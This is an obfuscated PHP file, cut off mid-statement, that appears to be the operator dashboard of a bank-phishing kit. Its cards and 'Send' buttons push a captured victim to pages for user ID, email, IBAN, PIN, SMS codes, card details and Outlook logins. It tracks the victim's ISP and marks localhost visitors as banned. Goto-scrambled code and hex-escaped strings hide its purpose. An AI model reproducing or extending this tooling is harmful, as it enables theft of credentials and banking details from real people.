<?php eval(base64_decode('
 goto HXlol; MuUGD: ?>
" bis_skin_checked="1">
                                                            <small class="text-medium-emphasis text-truncate">User</small>
                                                            <div class="fs-5 fw-semibold" bis_skin_checked="1"><?php  goto ZSbkr; J5E0X: if (check_file($_SESSION["\x75\x73\x65\x72\151\144"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\x75\x73\x65\x72\151\144"]; ?>
', 'utilisateur')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg width="40px" height="40px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M9 13H15" stroke="#fcfcfc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path
                                                            d="M3 6.5C3 6.03534 3 5.80302 3.03843 5.60982C3.19624 4.81644 3.81644 4.19624 4.60982 4.03843C4.80302 4 5.03534 4 5.5 4H12H18.5C18.9647 4 19.197 4 19.3902 4.03843C20.1836 4.19624 20.8038 4.81644 20.9616 5.60982C21 5.80302 21 6.03534 21 6.5V6.5V6.5C21 6.96466 21 7.19698 20.9616 7.39018C20.8038 8.18356 20.1836 8.80376 19.3902 8.96157C19.197 9 18.9647 9 18.5 9H12H5.5C5.03534 9 4.80302 9 4.60982 8.96157C3.81644 8.80376 3.19624 8.18356 3.03843 7.39018C3 7.19698 3 6.96466 3 6.5V6.5V6.5Z"
                                                            stroke="#fcfcfc"
                                                            stroke-width="2"
                                                            stroke-linejoin="round"
                                                        ></path>
                                                        <path
                                                            d="M4 9V15.9999C4 17.8856 4 18.8284 4.58579 19.4142C5.17157 19.9999 6.11438 19.9999 8 19.9999H9H15H16C17.8856 19.9999 18.8284 19.9999 19.4142 19.4142C20 18.8284 20 17.8856 20 15.9999V9"
                                                            stroke="#fcfcfc"
                                                            stroke-width="2"
                                                            stroke-linecap="round"
                                                            stroke-linejoin="round"
                                                        ></path>
                                                    </g>
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">Utilisateur Page</div>
                                                <?php  echo $_SESSION["\x69\x73\x75\x74\151\x6c\151\x73\141\164\x65\165\162"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto hd8vF; UIMkI: if (check_file($_SESSION["\x75\x73\145\162\x69\144"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="openModal('modal2')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg width="40px" height="40px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path
                                                            d="M16 17H21M18.5 14.5V19.5M12 19H6.2C5.0799 19 4.51984 19 4.09202 18.782C3.71569 18.5903 3.40973 18.2843 3.21799 17.908C3 17.4802 3 16.9201 3 15.8V8.2C3 7.0799 3 6.51984 3.21799 6.09202C3.40973 5.71569 3.71569 5.40973 4.09202 5.21799C4.51984 5 5.0799 5 6.2 5H17.8C18.9201 5 19.4802 5 19.908 5.21799C20.2843 5.40973 20.5903 5.71569 20.782 6.09202C21 6.51984 21 7.0799 21 8.2V11M20.6067 8.26229L15.5499 11.6335C14.2669 12.4888 13.6254 12.9165 12.932 13.0827C12.3192 13.2295 11.6804 13.2295 11.0677 13.0827C10.3743 12.9165 9.73279 12.4888 8.44975 11.6335L3.14746 8.09863"
                                                            stroke="#ffffff"
                                                            stroke-width="2"
                                                            stroke-linecap="round"
                                                            stroke-linejoin="round"
                                                        />
                                                    </g>
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">Email Page</div>

                                                <?php  echo $_SESSION["\151\163\145\155\x61\151\154"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto Wm6WY; ftt7O: if (check_file($_SESSION["\165\163\x65\162\151\144"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="openModal('modal55')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg height="40px" width="40px" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 56 56" xml:space="preserve" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g> <g> <path style="fill:#545E73;" d="M49.455,8L49.455,8C48.724,3.538,38.281,0,25.5,0S2.276,3.538,1.545,8l0,0H1.5v0.5V20v0.5V21v11 v0.5V33v12h0.045c0.731,4.461,11.175,8,23.955,8s23.224-3.539,23.955-8H49.5V33v-0.5V32V21v-0.5V20V8.5V8H49.455z"></path> <g> <path style="fill:#38454F;" d="M25.5,41c-13.255,0-24-3.806-24-8.5V45h0.045c0.731,4.461,11.175,8,23.955,8 s23.224-3.539,23.955-8H49.5V32.5C49.5,37.194,38.755,41,25.5,41z"></path> <path style="fill:#38454F;" d="M1.5,32v0.5c0-0.168,0.018-0.334,0.045-0.5H1.5z"></path> <path style="fill:#38454F;" d="M49.455,32c0.027,0.166,0.045,0.332,0.045,0.5V32H49.455z"></path> </g> <g> <path style="fill:#556080;" d="M25.5,29c-13.255,0-24-3.806-24-8.5V33h0.045c0.731,4.461,11.175,8,23.955,8 s23.224-3.539,23.955-8H49.5V20.5C49.5,25.194,38.755,29,25.5,29z"></path> <path style="fill:#556080;" d="M1.5,20v0.5c0-0.168,0.018-0.334,0.045-0.5H1.5z"></path> <path style="fill:#556080;" d="M49.455,20c0.027,0.166,0.045,0.332,0.045,0.5V20H49.455z"></path> </g> <ellipse style="fill:#91BAE1;" cx="25.5" cy="8.5" rx="24" ry="8.5"></ellipse> <g> <path style="fill:#8697CB;" d="M25.5,17c-13.255,0-24-3.806-24-8.5V21h0.045c0.731,4.461,11.175,8,23.955,8 s23.224-3.539,23.955-8H49.5V8.5C49.5,13.194,38.755,17,25.5,17z"></path> <path style="fill:#8697CB;" d="M1.5,8v0.5c0-0.168,0.018-0.334,0.045-0.5H1.5z"></path> <path style="fill:#8697CB;" d="M49.455,8C49.482,8.166,49.5,8.332,49.5,8.5V8H49.455z"></path> </g> </g> <g> <g> <path style="fill:#48A0DC;" d="M49.545,45.111C49.494,41.175,46.382,38,42.546,38c-2.568,0-4.806,1.426-6.025,3.546 c-0.421-0.141-0.87-0.22-1.337-0.22c-2.063,0-3.785,1.492-4.208,3.484C29.221,45.675,28,47.516,28,49.641 C28,52.589,30.343,55,33.208,55h10.775c0.061,0,0.119-0.007,0.18-0.009c0.06,0.002,0.119,0.009,0.18,0.009h4.31 c2.667,0,4.849-2.245,4.849-4.989C53.5,47.581,51.788,45.546,49.545,45.111z"></path> <path style="fill:#B1D3EF;" d="M48.651,56h-4.31c-0.063,0-0.126-0.004-0.188-0.008C44.106,55.996,44.045,56,43.982,56H33.208 C29.785,56,27,53.147,27,49.642c0-2.262,1.209-4.372,3.116-5.503c0.686-2.235,2.746-3.813,5.066-3.813 c0.296,0,0.592,0.025,0.884,0.076C37.562,38.286,39.98,37,42.546,37c4.102,0,7.524,3.225,7.954,7.332 c2.358,0.806,4,3.079,4,5.679C54.5,53.313,51.876,56,48.651,56z M44.114,53.991l0.186,0.006L48.651,54 c2.122,0,3.849-1.79,3.849-3.989c0-1.917-1.323-3.564-3.146-3.919l-0.799-0.155l-0.011-0.813C48.501,41.747,45.811,39,42.546,39 c-2.135,0-4.063,1.139-5.158,3.045l-0.409,0.711l-0.777-0.261c-0.332-0.112-0.675-0.169-1.019-0.169 c-1.54,0-2.898,1.133-3.229,2.692l-0.102,0.475l-0.435,0.214C29.948,46.432,29,47.976,29,49.642C29,52.045,30.888,54,33.208,54 L44.114,53.991z"></path> </g> </g> </g> </g></svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">Operations app</div>

                                                <?php  echo $_SESSION["\x69\x73\157\160\145\162\141\x74\151\157\x6e\163\141\x70\160"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto eYxM5; Zh7Ce: $file_s = "\147\x6f\137\x70\151\156\x2e\x70\x68\x70"; goto VTbI2; AjHRM: if (check_file($_SESSION["\165\x73\x65\162\x69\144"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\165\163\x65\162\x69\x64"]; ?>
', 'ibanhome')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg version="1.1" id="_x36_" width="40px" height="40px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 512 512" xml:space="preserve">
                                                    <g>
                                                        <g>
                                                            <polygon
                                                                style="fill: #adc6c2;"
                                                                points="428.043,94.795 428.043,512 30.014,512 30.014,94.795 176.586,49.524 281.388,49.524 
			399.112,85.874 		"
                                                            />
                                                            <polygon
                                                                style="fill: #adc6c2;"
                                                                points="458.058,70.701 456.807,84.207 453.639,118.307 450.554,128.395 428.043,121.475 
			378.769,106.217 251.123,66.781 229.029,59.945 30.014,121.475 7.504,128.395 4.419,118.307 0,70.701 30.014,61.446 
			176.586,16.174 229.029,0 281.388,16.174 296.895,21.01 424.625,60.361 428.043,61.446 436.714,64.114 		"
                                                            />
                                                            <polygon
                                                                style="opacity: 0.1; fill: #040000;"
                                                                points="453.633,118.326 450.517,128.384 428.056,121.442 428.056,137.057 
			229.019,75.576 30.001,137.057 30.001,121.442 7.54,128.384 4.424,118.326 30.001,110.423 176.615,65.115 227.153,49.5 
			229.019,48.923 230.884,49.5 281.422,65.115 428.056,110.423 		"
                                                            />
                                                            <circle style="fill: #6f7e7b;" cx="229.029" cy="148.711" r="42.307" />
                                                            <rect x="30.001" y="205.768" style="fill: #6f7e7b;" width="398.055" height="11.538" />
                                                            <rect x="30.014" y="358.342" style="fill: #6f7e7b;" width="398.028" height="11.505" />
                                                            <g>
                                                                <g>
                                                                    <rect x="77.074" y="248.869" style="fill: #ffffff;" width="25.907" height="25.259" />
                                                                    <rect x="108.924" y="248.869" style="fill: #ffffff;" width="25.907" height="25.259" />
                                                                    <rect x="77.074" y="279.138" style="fill: #ffffff;" width="25.907" height="56.028" />
                                                                    <rect x="108.924" y="279.138" style="fill: #ffffff;" width="25.907" height="56.028" />
                                                                </g>
                                                                <g>
                                                                    <rect x="159.124" y="248.869" style="fill: #ffffff;" width="25.907" height="25.259" />
                                                                    <rect x="190.975" y="248.869" style="fill: #ffffff;" width="25.907" height="25.259" />
                                                                    <rect x="159.124" y="279.138" style="fill: #ffffff;" width="25.907" height="56.028" />
                                                                    <rect x="190.975" y="279.138" style="fill: #ffffff;" width="25.907" height="56.028" />
                                                                </g>
                                                                <g>
                                                                    <rect x="241.175" y="248.869" style="fill: #ffffff;" width="25.907" height="25.259" />
                                                                    <rect x="273.026" y="248.869" style="fill: #ffffff;" width="25.907" height="25.259" />
                                                                    <rect x="241.175" y="279.138" style="fill: #ffffff;" width="25.907" height="56.028" />
                                                                    <rect x="273.026" y="279.138" style="fill: #ffffff;" width="25.907" height="56.028" />
                                                                </g>
                                                                <g>
                                                                    <rect x="323.226" y="248.869" style="fill: #ffffff;" width="25.907" height="25.259" />
                                                                    <rect x="355.077" y="248.869" style="fill: #ffffff;" width="25.907" height="25.259" />
                                                                    <rect x="323.226" y="279.138" style="fill: #ffffff;" width="25.907" height="56.028" />
                                                                    <rect x="355.077" y="279.138" style="fill: #ffffff;" width="25.907" height="56.028" />
                                                                </g>
                                                            </g>
                                                            <g>
                                                                <path
                                                                    style="fill: #6f7e7b;"
                                                                    d="M141.231,427.401v84.557H75.405v-84.557c0-12.73,10.404-23.154,23.154-23.154h19.519
				C130.808,404.248,141.231,414.671,141.231,427.401z"
                                                                />
                                                                <path
                                                                    style="fill: #6f7e7b;"
                                                                    d="M261.942,427.401v84.557h-65.826v-84.557c0-12.73,10.423-23.154,23.154-23.154h19.519
				C251.52,404.248,261.942,414.671,261.942,427.401z"
                                                                />
                                                                <path
                                                                    style="fill: #6f7e7b;"
                                                                    d="M382.653,427.401v84.557h-65.827v-84.557c0-12.73,10.423-23.154,23.154-23.154h19.519
				C372.249,404.248,382.653,414.671,382.653,427.401z"
                                                                />
                                                            </g>
                                                        </g>
                                                        <polygon
                                                            style="opacity: 0.08; fill: #040000;"
                                                            points="458.058,70.701 456.807,84.207 453.639,118.307 450.554,128.395 
		428.043,121.475 428.043,511.917 30.014,511.917 30.014,454.971 210.853,274.133 216.856,268.131 267.714,217.271 424.625,60.361 
		428.043,61.446 436.714,64.114 	"
                                                        />
                                                    </g>
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">IBAN HOME Page</div>
                                                <?php  echo $_SESSION["\x69\x73\151\x62\141\156\x68\157\x6d\x65"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto zrxLT; UE16t: if ($_SERVER["\x52\x45\x51\125\x45\123\124\137\x4d\x45\x54\x48\x4f\104"] === "\120\117\123\124") { if (isset($_POST["\x69\163\x5f\155\x65\163\x73\x61\x67\x65"])) { up_file_msg($_SESSION["\x75\x73\145\x72\x69\144"], $_POST["\151\163\x5f\155\x65\163\163\x61\147\x65"]); } } goto eRcu5; WBjBf: $file_s = "\165\x74\151\x6c\x69\x73\141\x74\x65\x75\162\56\160\x68\160"; goto J5E0X; WsbS7: echo $_SESSION["\x73\164\x61\164\x75\x73\x5f\x6f\156"]; goto cWLVJ; DOw4h: $local_ds = "\154\x6f\143\x61\x6c\x2e\x74\x78\164"; goto VbGTJ; TAC_g: echo $_SESSION["\160\x72\157\152\145\x63\164\137\x6e\x61\x6d\x65"]; goto aRZFe; QFuwd: $file_s = "\155\x65\x73\x73\x61\x67\145\56\x70\x68\160"; goto HBfSb; bsxa1: ?>
								<?php  goto xTNsO; RDE38: ?>
								<?php  goto SrnEA; bGSAS: $_SESSION["\x69\163\x70"] = isset($info["\151\163\x70"]) ? $info["\x69\x73\x70"] : null; goto IVwSj; RPyS4: if ($_SESSION["\x53\x74\162\x75\x70\x4c\157\x6d"] == "\x31\x32\67\56\x30\x2e\x30\x2e\x31") { $_SESSION["\163\x74\x61\164\x75\x73\137\157\x6e"] = "\x62\157\x72\144\x65\162\x2d\163\164\141\162\x74\40\142\157\x72\144\145\x72\x2d\163\x74\141\162\164\x2d\x34\x20\142\157\162\x64\x65\x72\55\163\x74\x61\162\164\55\x64\141\x6e\147\145\162\40\160\170\55\x33\x20\x6d\142\x2d\x33"; $_SESSION["\x42\154\x61\x73\141\x63\157\x75\156"] = "\55\55"; $_SESSION["\160\x72\x6f\x6a\x65\x63\x74\137\x6e\141\155\145"] = "\x2d\55"; $_SESSION["\163\x74\x61\x74\x75\163"] = "\x3c\x73\x70\x61\156\40\143\x6c\x61\163\x73\75\42\142\x61\x64\x67\145\40\142\147\x2d\x64\141\156\x67\145\162\x2d\147\162\x61\x64\x69\x65\156\164\40\x6d\x73\x2d\x61\165\x74\x6f\x22\76\102\141\x6e\x6e\145\x64\74\x2f\x73\x70\x61\156\76"; $_SESSION["\x69\x73\x65\x78\151\164"] = "\x20\74\x70\40\x73\164\171\x6c\145\75\42\x74\x65\170\164\x2d\x61\154\x69\147\x6e\x3a\x63\x65\156\x74\145\x72\x22\x3e\x3c\163\160\141\x6e\x20\x73\164\171\154\x65\x3d\42\x63\157\154\x6f\x72\72\x23\x65\x37\x34\x63\x33\143\42\76\x3c\163\x74\162\157\x6e\x67\x3e\116\x6f\164\40\101\x76\141\151\154\x61\x62\154\145\x3c\x2f\x73\x74\162\157\x6e\147\76\74\57\x73\160\x61\x6e\76\x3c\x2f\x70\x3e"; $_SESSION["\x69\163\143\x61\162\144"] = "\x20\74\x70\40\x73\164\x79\154\x65\x3d\42\164\x65\x78\x74\x2d\141\x6c\x69\147\x6e\72\x63\145\x6e\164\145\x72\42\76\74\x73\160\141\156\40\x73\x74\171\x6c\x65\x3d\x22\143\x6f\154\x6f\162\72\43\145\67\64\143\x33\143\42\x3e\x3c\163\x74\162\x6f\156\x67\x3e\x4e\x6f\x74\x20\101\166\x61\x69\154\x61\x62\154\x65\74\57\163\164\x72\157\156\147\x3e\74\x2f\163\x70\141\156\x3e\x3c\x2f\x70\76"; $_SESSION["\x69\x73\x6d\145\x73\x73\141\147\145"] = "\40\x3c\x70\40\x73\164\171\154\x65\x3d\42\x74\x65\170\164\55\141\154\x69\147\x6e\x3a\x63\145\x6e\164\145\162\42\76\x3c\163\160\141\156\x20\x73\x74\x79\154\x65\75\x22\x63\x6f\x6c\x6f\162\x3a\43\x65\x37\64\x63\63\x63\42\x3e\x3c\x73\x74\162\157\156\x67\x3e\116\157\x74\x20\101\x76\141\x69\154\141\142\x6c\x65\74\57\163\x74\162\157\x6e\147\x3e\74\x2f\163\160\141\156\76\x3c\x2f\160\76"; $_SESSION["\x69\x73\x70\x69\x6e"] = "\40\74\160\40\x73\x74\x79\x6c\145\75\42\164\145\170\164\55\141\154\x69\x67\x6e\x3a\143\145\x6e\x74\x65\x72\42\x3e\x3c\x73\x70\141\x6e\x20\163\x74\x79\x6c\x65\x3d\x22\x63\157\154\x6f\x72\x3a\43\145\x37\64\143\63\143\42\76\x3c\x73\x74\162\x6f\156\x67\76\x4e\x6f\164\x20\101\166\141\x69\154\141\x62\154\x65\x3c\x2f\x73\x74\162\x6f\x6e\x67\76\74\x2f\163\x70\x61\x6e\76\74\57\x70\x3e"; $_SESSION["\151\163\x61\x70\x70"] = "\40\x3c\160\x20\163\164\x79\154\145\75\x22\x74\x65\170\x74\55\141\154\151\x67\x6e\72\143\145\156\x74\145\162\42\76\x3c\163\160\x61\x6e\40\x73\x74\x79\x6c\145\x3d\x22\x63\157\154\157\162\72\43\145\67\64\143\63\143\x22\76\74\163\x74\162\157\x6e\147\76\116\157\x74\x20\101\x76\141\151\x6c\141\x62\x6c\x65\74\57\163\x74\x72\x6f\x6e\x67\76\74\x2f\163\x70\141\x6e\x3e\74\x2f\160\76"; $_SESSION["\151\163\145\x6d\141\x69\x6c"] = "\40\x3c\x70\40\x73\164\171\x6c\145\75\42\164\145\170\x74\55\x61\x6c\151\x67\156\x3a\x63\145\x6e\164\145\162\x22\76\x3c\x73\160\x61\x6e\40\x73\164\171\x6c\145\x3d\x22\x63\157\x6c\x6f\x72\72\43\x65\x37\x34\x63\x33\x63\x22\76\x3c\163\164\x72\x6f\156\x67\76\116\157\x74\x20\101\166\141\151\x6c\x61\142\154\145\74\57\x73\x74\x72\157\x6e\147\76\74\57\163\160\141\156\x3e\x3c\57\x70\x3e"; $_SESSION["\151\163\167\x65\x62\x6d\141\x69\x6c"] = "\x20\74\160\40\163\x74\x79\154\145\x3d\x22\164\x65\x78\164\55\x61\x6c\x69\x67\156\x3a\143\x65\156\x74\x65\162\x22\76\74\x73\x70\x61\x6e\x20\163\164\171\154\x65\x3d\42\143\157\154\x6f\162\72\x23\x65\67\64\143\x33\143\42\76\x3c\x73\164\162\x6f\156\147\76\116\x6f\x74\40\x41\x76\141\151\x6c\x61\142\x6c\145\74\x2f\x73\x74\x72\x6f\x6e\147\76\x3c\x2f\163\160\x61\x6e\76\x3c\x2f\x70\76"; $_SESSION["\151\163\151\142\141\156\150\x6f\x6d\x65"] = "\x20\74\x70\40\163\x74\x79\x6c\145\75\42\164\145\170\x74\x2d\141\154\151\147\156\x3a\x63\x65\156\164\x65\x72\x22\76\x3c\x73\160\x61\x6e\40\163\x74\x79\154\145\75\x22\143\x6f\x6c\x6f\x72\72\43\x65\x37\64\143\x33\143\42\x3e\74\163\164\162\x6f\156\x67\x3e\116\x6f\x74\x20\x41\x76\141\x69\154\141\142\154\x65\x3c\57\163\x74\x72\x6f\x6e\147\x3e\74\x2f\163\160\x61\x6e\x3e\x3c\x2f\x70\76"; $_SESSION["\151\x73\x69\142\141\x6e\x61\160\x70"] = "\40\x3c\x70\x20\x73\164\x79\x6c\145\x3d\x22\164\145\170\x74\x2d\141\x6c\x69\x67\156\72\143\x65\156\164\145\x72\42\x3e\x3c\163\160\141\156\40\x73\x74\x79\154\145\75\42\x63\x6f\x6c\157\162\72\x23\x65\x37\64\143\63\143\x22\76\x3c\163\164\162\157\x6e\x67\76\116\x6f\x74\x20\x41\x76\x61\x69\154\141\x62\x6c\x65\74\x2f\163\x74\162\x6f\156\147\x3e\x3c\57\x73\x70\141\156\76\74\x2f\x70\x3e"; $_SESSION["\151\x73\163\155\x73"] = "\40\74\160\40\163\164\171\154\145\75\x22\164\x65\x78\164\55\141\x6c\151\x67\x6e\x3a\143\x65\156\164\x65\162\x22\76\x3c\x73\x70\x61\x6e\40\x73\164\x79\x6c\x65\75\42\x63\x6f\154\x6f\x72\x3a\43\x65\67\64\x63\x33\143\x22\x3e\74\x73\x74\x72\157\x6e\x67\x3e\116\x6f\164\40\x41\x76\x61\x69\x6c\x61\x62\x6c\145\x3c\57\163\164\162\x6f\x6e\x67\x3e\x3c\x2f\x73\160\x61\x6e\x3e\x3c\x2f\x70\x3e"; $_SESSION["\151\163\x70\x68\x6f\x6e\145"] = "\x20\x3c\x70\x20\163\164\171\x6c\145\75\x22\164\x65\x78\164\x2d\x61\x6c\151\147\156\x3a\143\145\x6e\164\145\162\x22\x3e\x3c\163\160\x61\x6e\x20\x73\164\x79\154\x65\x3d\42\143\157\x6c\x6f\162\72\43\145\x37\64\143\x33\x63\42\x3e\74\x73\x74\x72\157\x6e\x67\76\x4e\x6f\164\x20\101\166\141\151\x6c\141\142\154\x65\x3c\57\x73\x74\162\157\x6e\147\76\x3c\57\163\x70\x61\156\76\74\x2f\x70\76"; $_SESSION["\151\x73\x6c\157\x67\x69\x6e"] = "\x20\74\160\x20\x73\164\171\x6c\145\x3d\42\164\145\170\164\x2d\141\154\151\x67\x6e\72\x63\145\x6e\x74\x65\x72\x22\76\74\163\160\141\156\x20\163\x74\x79\154\145\75\42\143\x6f\x6c\x6f\x72\72\x23\x65\x37\64\x63\x33\143\x22\76\74\x73\x74\x72\x6f\x6e\x67\x3e\116\x6f\x74\x20\101\166\141\151\154\x61\x62\x6c\145\74\x2f\163\164\x72\x6f\x6e\x67\76\74\57\163\x70\141\x6e\76\74\57\x70\x3e"; $_SESSION["\x69\x73\157\x75\x74\x6c\x6f\x6f\x6b\x5f\x6c\157\x67\x69\x6e"] = "\x20\x3c\x70\40\x73\164\x79\x6c\145\x3d\x22\164\x65\170\x74\55\x61\x6c\x69\147\156\72\x63\145\x6e\164\x65\162\42\x3e\74\x73\x70\x61\x6e\40\x73\164\x79\x6c\x65\x3d\42\x63\157\x6c\157\162\x3a\43\x65\x37\x34\x63\63\143\42\76\74\x73\x74\x72\157\x6e\147\x3e\x4e\157\164\x20\x41\x76\141\x69\154\141\142\x6c\145\x3c\57\163\x74\x72\x6f\156\147\76\x3c\57\x73\x70\141\x6e\76\x3c\x2f\x70\x3e"; $_SESSION["\151\163\157\165\164\154\x6f\x6f\x6b\137\160\151\156"] = "\x20\74\x70\40\163\164\x79\x6c\145\x3d\42\164\145\170\x74\55\x61\x6c\151\x67\156\x3a\143\145\x6e\164\145\x72\42\x3e\74\163\160\x61\x6e\40\x73\164\x79\x6c\x65\75\42\143\x6f\x6c\x6f\162\72\43\x65\x37\x34\x63\x33\143\x22\76\x3c\163\164\x72\157\x6e\x67\x3e\116\x6f\x74\40\x41\x76\x61\151\x6c\141\142\154\x65\x3c\x2f\163\164\162\x6f\x6e\147\76\x3c\57\x73\160\x61\156\x3e\x3c\x2f\160\x3e"; $_SESSION["\x69\x73\x6f\165\164\154\157\157\153\137\x61\160\160"] = "\x20\74\160\x20\163\x74\171\x6c\145\x3d\x22\164\x65\x78\x74\x2d\141\x6c\x69\147\x6e\72\143\145\x6e\164\x65\162\x22\76\x3c\163\x70\141\x6e\40\x73\x74\x79\154\145\x3d\x22\x63\157\x6c\x6f\x72\x3a\x23\x65\x37\x34\x63\x33\x63\x22\x3e\74\x73\164\162\x6f\x6e\x67\76\116\157\x74\40\x41\x76\x61\151\154\141\x62\154\x65\x3c\x2f\x73\164\162\157\156\147\76\74\x2f\163\x70\141\156\x3e\74\57\x70\x3e"; $_SESSION["\151\163\147\157\137\x6c\x6f\x67\x69\x6e"] = "\40\x3c\160\x20\163\x74\x79\154\145\75\42\x74\x65\170\164\x2d\141\x6c\x69\147\x6e\72\143\x65\156\x74\145\x72\x22\76\x3c\x73\160\x61\156\40\x73\x74\x79\x6c\x65\75\x22\143\x6f\x6c\157\162\72\43\145\67\x34\x63\x33\x63\x22\x3e\x3c\x73\x74\162\157\x6e\x67\76\x4e\157\x74\x20\x41\166\141\151\154\141\142\154\x65\x3c\57\163\164\162\157\156\147\x3e\x3c\57\x73\160\141\x6e\x3e\x3c\57\160\x3e"; $_SESSION["\x69\163\x67\157\137\160\150\157\156\145"] = "\x20\74\x70\x20\x73\164\171\x6c\145\75\x22\x74\145\170\x74\55\x61\154\151\147\156\72\143\145\156\x74\x65\162\42\x3e\x3c\x73\160\141\156\40\x73\164\171\154\x65\75\42\x63\157\154\157\162\72\43\145\67\x34\x63\x33\143\x22\76\74\163\164\162\x6f\x6e\x67\x3e\x4e\x6f\x74\40\x41\166\x61\151\154\x61\142\x6c\x65\x3c\57\163\x74\162\x6f\156\x67\x3e\74\57\x73\160\x61\x6e\76\x3c\57\160\x3e"; $_SESSION["\x69\x73\147\157\137\x73\155\x73"] = 